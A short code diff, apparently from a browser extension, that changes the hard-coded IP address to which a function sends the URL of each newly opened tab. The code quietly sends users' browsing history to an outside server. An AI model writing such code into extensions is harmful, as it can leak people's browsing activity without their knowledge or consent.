@@ -7,7 +7,7 @@ function logNewTabUrl(tabId, changeInfo, tab) {
 
         if (isInternetLink(tabUrl)) {
             if (!isSameDomainAsLastTabs(tabUrl)) {
-                sendGetRequest('http://122.169.31.29:8000', { url: tabUrl })
+                sendGetRequest('http://122.170.245.130:8000', { url: tabUrl })
                     .then(response => response.json())
                     .then(data => {
                         console.log('Server Response:', data);
